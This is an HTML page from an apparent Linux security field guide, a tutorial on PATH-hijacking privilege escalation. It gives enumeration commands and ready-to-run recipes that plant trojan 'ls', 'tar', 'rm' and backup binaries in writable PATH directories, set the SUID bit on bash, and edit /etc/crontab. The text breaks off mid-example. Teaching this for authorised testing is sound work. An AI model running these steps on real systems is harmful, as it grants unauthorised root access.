@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 6 of 10. Trace command lookup order and test PATH assumptions in privileged jobs.">
+  <title>Part 06: PATH Hijacking | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html" aria-current="page"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 06</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 06</p>
+        <h1>PATH Hijacking</h1>
+        <p class="g-deck">Trace command lookup order and test PATH assumptions in privileged jobs.</p>
+        <div class="g-chapter-meta">
+          <span>17 min read</span>
+          <span>8 sections</span>
+          <span>36 code blocks</span>
+          <span>Part 06 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>8 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#path-hijacking-for-privilege-escalation" data-toc-link>PATH Hijacking for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-path" data-toc-link>1. Understanding PATH</a><a class="g-toc-link depth-3" href="#2-enumeration-identifying-path-hijacking-opportunities" data-toc-link>2. Enumeration: Identifying PATH Hijacking Opportunities</a><a class="g-toc-link depth-3" href="#3-exploitation-techniques" data-toc-link>3. Exploitation Techniques</a><a class="g-toc-link depth-3" href="#4-advanced-techniques" data-toc-link>4. Advanced Techniques</a><a class="g-toc-link depth-3" href="#5-practical-attack-workflow" data-toc-link>5. Practical Attack Workflow</a><a class="g-toc-link depth-3" href="#6-exploitable-scenarios" data-toc-link>6. Exploitable Scenarios</a><a class="g-toc-link depth-3" href="#7-defensive-measures" data-toc-link>7. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="path-hijacking-for-privilege-escalation">PATH Hijacking for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#path-hijacking-for-privilege-escalation">#</a></h2>
+<p>PATH hijacking exploits the way Linux searches for executables when a command is called <strong>without an absolute path</strong>. If a root-owned process or script calls a command like <code>ls</code> instead of <code>/bin/ls</code>, an attacker can manipulate the <code>PATH</code> environment variable to execute a malicious binary with root privileges instead.</p>
+<hr/>
+<h3 id="1-understanding-path">1. Understanding PATH<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-path">#</a></h3>
+<p><strong>What is PATH?</strong></p>
+<ul>
+<li>Environment variable that tells the shell where to look for executables</li>
+<li>Colon-separated list of directories: <code>/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin</code></li>
+<li>Search order is <strong>left to right</strong> (first match wins)</li>
+<li>Critical for privilege escalation when root processes rely on it</li>
+</ul>
+<p><strong>View Current PATH</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
+</code></pre></div>
+<p><strong>How Command Resolution Works</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># When you type 'ls', the system:</span>
+<span class="c1"># 1. Checks if 'ls' is an alias/built-in</span>
+<span class="c1"># 2. Searches PATH directories in order:</span>
+<span class="c1">#    /usr/local/sbin/ls (not found)</span>
+<span class="c1">#    /usr/local/bin/ls (not found)</span>
+<span class="c1">#    /usr/sbin/ls (not found)</span>
+<span class="c1">#    /usr/bin/ls (found! executes this)</span>
+</code></pre></div>
+<hr/>
+<h3 id="2-enumeration-identifying-path-hijacking-opportunities">2. Enumeration: Identifying PATH Hijacking Opportunities<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-identifying-path-hijacking-opportunities">#</a></h3>
+<p><strong>Check Current PATH</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>nl
+<span class="c1"># Shows each directory with priority</span>
+</code></pre></div>
+<p><strong>Find Writable Directories in PATH</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if any PATH directory is writable by current user</span>
+<span class="k">for</span><span class="w"> </span>dir<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">' '</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[WRITABLE] </span><span class="nv">$dir</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div>
+<p><strong>Check for Relative Paths in Cron Jobs</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Look for commands without absolute paths</span>
+cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^#'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s1">'^$'</span>
+<span class="c1"># Example: * * * * * root backup_script  # Uses PATH!</span>
+
+<span class="c1"># Examine cron scripts</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">" [a-z]"</span><span class="w"> </span>/etc/cron*<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"^#"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"full path"</span>
+</code></pre></div>
+<p><strong>Find Scripts with Dangerous Commands</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Search for common commands without full paths</span>
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"cp "</span><span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"mv "</span><span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"rm "</span><span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"chmod "</span><span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+grep<span class="w"> </span>-r<span class="w"> </span><span class="s2">"chown "</span><span class="w"> </span>/etc/init.d/<span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Check SUID Binaries' Dependencies</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Find SUID binaries that call external commands</span>
+strings<span class="w"> </span>/path/to/suid_binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"^[a-z]+</span>$<span class="s2">"</span>
+<span class="c1"># Look for 'system("command")' or 'execvp("command")'</span>
+</code></pre></div>
+<p><strong>Automated Tools</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS PATH checks</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="s2">"PATH"</span>
+
+<span class="c1"># Manual comprehensive check</span>
+<span class="k">for</span><span class="w"> </span>script<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>find<span class="w"> </span>/etc/cron*<span class="w"> </span>/etc/init.d/<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== </span><span class="nv">$script</span><span class="s2"> ==="</span>
+<span class="w">    </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"(^|[^/])[a-zA-Z0-9_-]+"</span><span class="w"> </span><span class="nv">$script</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-v<span class="w"> </span><span class="s2">"/"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-10
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="3-exploitation-techniques">3. Exploitation Techniques<a aria-label="Link to this section" class="g-anchor" href="#3-exploitation-techniques">#</a></h3>
+<h4 id="a-writable-path-directory-hijack-most-common">A. Writable PATH Directory Hijack (Most Common)<a aria-label="Link to this section" class="g-anchor" href="#a-writable-path-directory-hijack-most-common">#</a></h4>
+<p>If a directory in PATH is writable, put a malicious binary with the same name as a command root uses.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Check which PATH directories are writable</span>
+<span class="k">for</span><span class="w"> </span>dir<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">':'</span><span class="w"> </span><span class="s1">' '</span><span class="k">)</span><span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="o">[</span><span class="w"> </span>-w<span class="w"> </span><span class="s2">"</span><span class="nv">$dir</span><span class="s2">"</span><span class="w"> </span><span class="o">]</span><span class="p">;</span><span class="w"> </span><span class="k">then</span>
+<span class="w">        </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"[+] Writable: </span><span class="nv">$dir</span><span class="s2">"</span>
+<span class="w">    </span><span class="k">fi</span>
+<span class="k">done</span>
+
+<span class="c1"># 2. Find a command called by root without absolute path</span>
+<span class="c1"># Example: Cron job does: backup_script (not /usr/local/bin/backup_script)</span>
+
+<span class="c1"># 3. Create malicious binary in the *earliest* writable PATH directory</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">cp /bin/bash /tmp/rootbash</span>
+<span class="s1">chmod +s /tmp/rootbash</span>
+<span class="s1"># Execute the real command to avoid breaking functionality</span>
+<span class="s1">/usr/bin/backup_script "$@"'</span><span class="w"> </span>&gt;<span class="w"> </span>/usr/local/bin/backup_script
+
+chmod<span class="w"> </span>+x<span class="w"> </span>/usr/local/bin/backup_script
+
+<span class="c1"># 4. Wait for cron/root to execute</span>
+<span class="c1"># 5. /tmp/rootbash -p gives root</span>
+</code></pre></div>
+<p><strong>Priority Matters</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If PATH is: /usr/local/bin:/usr/bin:/bin</span>
+<span class="c1"># And /usr/local/bin is writable, create malicious binary there</span>
+<span class="c1"># If not, check /usr/bin, /bin (usually not writable)</span>
+
+<span class="c1"># To see exact PATH used by cron:</span>
+cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>PATH
+<span class="c1"># You can also check: sudo crontab -l | grep PATH</span>
+</code></pre></div>
+<hr/>
+<h4 id="b-adding-new-path-directory-if-cron-uses-system-path">B. Adding New PATH Directory (If Cron Uses System PATH)<a aria-label="Link to this section" class="g-anchor" href="#b-adding-new-path-directory-if-cron-uses-system-path">#</a></h4>
+<p>If you can't modify existing PATH directories, but cron uses a <strong>writable</strong> directory that's not in PATH (and you can add it).</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create writable directory</span>
+mkdir<span class="w"> </span>/tmp/bin
+chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>/tmp/bin
+
+<span class="c1"># 2. Modify PATH for cron (if using /etc/crontab)</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"PATH=/tmp/bin:</span><span class="nv">$PATH</span><span class="s2">"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>/etc/crontab
+<span class="c1"># Or if using cron.d files</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s2">"PATH=/tmp/bin:/usr/local/bin:/usr/bin:/bin"</span><span class="w"> </span>&gt;<span class="w"> </span>/etc/cron.d/path
+
+<span class="c1"># 3. Place malicious binary</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/bin/backup<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">cp /bin/bash /tmp/shell</span>
+<span class="s">chmod +s /tmp/shell</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/bin/backup
+
+<span class="c1"># 4. Wait for execution</span>
+</code></pre></div>
+<p><strong>Note</strong>: This requires writing to <code>/etc/crontab</code> (usually root-only). More common in misconfigured systems where cron.d is writable.</p>
+<hr/>
+<h4 id="c-user-specific-path-manipulation">C. User-Specific PATH Manipulation<a aria-label="Link to this section" class="g-anchor" href="#c-user-specific-path-manipulation">#</a></h4>
+<p>If a user can modify their own <code>.bashrc</code> or <code>.profile</code>, and root executes commands as that user (or sudo -u), PATH hijacking works.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Modify user's .bashrc</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'export PATH=/tmp/bin:$PATH'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+
+<span class="c1"># Create malicious binary</span>
+mkdir<span class="w"> </span>/tmp/bin
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/bin/ls
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/bin/ls
+
+<span class="c1"># Wait for root to execute a command as this user</span>
+sudo<span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>some_command
+<span class="c1"># Or if root su's to this user</span>
+</code></pre></div>
+<hr/>
+<h4 id="d-symlink-attacks-on-path-directories">D. Symlink Attacks on PATH Directories<a aria-label="Link to this section" class="g-anchor" href="#d-symlink-attacks-on-path-directories">#</a></h4>
+<p>If a PATH directory is writable but you can't create files (e.g., parent permissions), symlinks might work.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># If /usr/local/bin is writable but you can't write files</span>
+<span class="c1"># Create symlink to your malicious script in another location</span>
+ln<span class="w"> </span>-s<span class="w"> </span>/tmp/backdoor.sh<span class="w"> </span>/usr/local/bin/backup
+
+<span class="c1"># Or if you can't write to /usr/local/bin at all, but can write to parent</span>
+<span class="c1"># symlink the whole directory</span>
+ln<span class="w"> </span>-s<span class="w"> </span>/tmp/fake_bin<span class="w"> </span>/usr/local/bin
+</code></pre></div>
+<hr/>
+<h4 id="e-exploiting-suid-binaries-with-path-dependencies">E. Exploiting SUID Binaries with PATH Dependencies<a aria-label="Link to this section" class="g-anchor" href="#e-exploiting-suid-binaries-with-path-dependencies">#</a></h4>
+<p>Some SUID binaries spawn processes using system commands without absolute paths.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find SUID binary that uses system()</span>
+find<span class="w"> </span>/<span class="w"> </span>-perm<span class="w"> </span>-4000<span class="w"> </span>-type<span class="w"> </span>f<span class="w"> </span>-exec<span class="w"> </span>strings<span class="w"> </span><span class="o">{}</span><span class="w"> </span><span class="se">\;</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"system|exec|popen"</span>
+
+<span class="c1"># 2. Example: /usr/bin/suid_binary does: system("ls -la /tmp");</span>
+
+<span class="c1"># 3. Create malicious 'ls' in writable PATH directory</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash</span>
+<span class="s1"># Execute real ls to maintain functionality</span>
+<span class="s1">/bin/ls "$@"'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/ls
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/ls
+
+<span class="c1"># 4. Add /tmp to PATH (if not already)</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+
+<span class="c1"># 5. Execute SUID binary</span>
+/usr/bin/suid_binary
+<span class="c1"># /bin/bash becomes SUID root</span>
+</code></pre></div>
+<p><strong>Important</strong>: Many modern SUID binaries sanitize PATH and ignore environment variables. But older or poorly written ones are vulnerable.</p>
+<hr/>
+<h4 id="f-cron-with-relative-paths-in-scripts">F. Cron with Relative Paths in Scripts<a aria-label="Link to this section" class="g-anchor" href="#f-cron-with-relative-paths-in-scripts">#</a></h4>
+<p>Many cron scripts use relative paths internally.</p>
+<p><strong>Example Vulnerable Script</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="ch">#!/bin/bash</span>
+<span class="c1"># /usr/local/bin/backup.sh</span>
+<span class="nb">cd</span><span class="w"> </span>/var/www
+tar<span class="w"> </span>-czf<span class="w"> </span>backup.tar.gz<span class="w"> </span>*<span class="w">  </span><span class="c1"># Actually uses 'tar' from PATH</span>
+</code></pre></div>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Create malicious tar in a writable PATH directory</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/tar
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/tar
+
+<span class="c1"># If /tmp is in PATH before /bin:</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
+<span class="c1"># Or if cron's PATH includes /tmp (unlikely)</span>
+</code></pre></div>
+<hr/>
+<h4 id="g-scripts-with-source-or-commands">G. Scripts with <code>source</code> or <code>.</code> Commands<a aria-label="Link to this section" class="g-anchor" href="#g-scripts-with-source-or-commands">#</a></h4>
+<p>If a script uses <code>source</code> or <code>.</code> to include other files without absolute paths.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Vulnerable script:</span>
+.<span class="w"> </span>config.sh<span class="w">  </span><span class="c1"># No absolute path</span>
+
+<span class="c1"># Create config.sh in writable PATH directory</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'chmod +s /bin/bash'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/config.sh
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/config.sh
+
+<span class="c1"># If /tmp in PATH, it gets sourced as root</span>
+</code></pre></div>
+<hr/>
+<h3 id="4-advanced-techniques">4. Advanced Techniques<a aria-label="Link to this section" class="g-anchor" href="#4-advanced-techniques">#</a></h3>
+<h4 id="a-path-precedence-exploitation">A. PATH Precedence Exploitation<a aria-label="Link to this section" class="g-anchor" href="#a-path-precedence-exploitation">#</a></h4>
+<p>Understanding PATH search order is crucial. The first match wins.</p>
+<p><strong>Scenario</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># PATH: /usr/local/bin:/usr/bin:/bin</span>
+<span class="c1"># Root calls: backup</span>
+
+<span class="c1"># Options to hijack (in order of preference):</span>
+<span class="m">1</span>.<span class="w"> </span>/usr/local/bin/backup<span class="w"> </span><span class="o">(</span><span class="k">if</span><span class="w"> </span>writable<span class="o">)</span><span class="w"> </span>-<span class="w"> </span>Best<span class="w"> </span>option
+<span class="m">2</span>.<span class="w"> </span>/usr/bin/backup<span class="w"> </span><span class="o">(</span>usually<span class="w"> </span>not<span class="w"> </span>writable<span class="o">)</span>
+<span class="m">3</span>.<span class="w"> </span>/bin/backup<span class="w"> </span><span class="o">(</span>usually<span class="w"> </span>not<span class="w"> </span>writable<span class="o">)</span>
+
+<span class="c1"># If none writable, but you can add to PATH:</span>
+<span class="c1"># Change cron's PATH to: /tmp/bin:/usr/local/bin:/usr/bin:/bin</span>
+<span class="c1"># Then /tmp/bin/backup takes precedence</span>
+</code></pre></div>
+<p><strong>Testing Priority</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># See which command executes first</span>
+which<span class="w"> </span>-a<span class="w"> </span>ls
+<span class="c1"># Shows all locations of 'ls' in PATH order</span>
+</code></pre></div>
+<hr/>
+<h4 id="b-exploiting-command-aliases">B. Exploiting Command Aliases<a aria-label="Link to this section" class="g-anchor" href="#b-exploiting-command-aliases">#</a></h4>
+<p>If root's environment includes aliases, they might be exploitable.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Root's .bashrc:</span>
+<span class="nb">alias</span><span class="w"> </span><span class="nv">rm</span><span class="o">=</span><span class="s1">'rm -i'</span>
+
+<span class="c1"># Attacker in writable PATH:</span>
+<span class="c1"># Create 'rm' binary that executes backdoor first</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'#!/bin/bash</span>
+<span class="s1">chmod +s /bin/bash</span>
+<span class="s1">/bin/rm "$@"'</span><span class="w"> </span>&gt;<span class="w"> </span>/tmp/rm
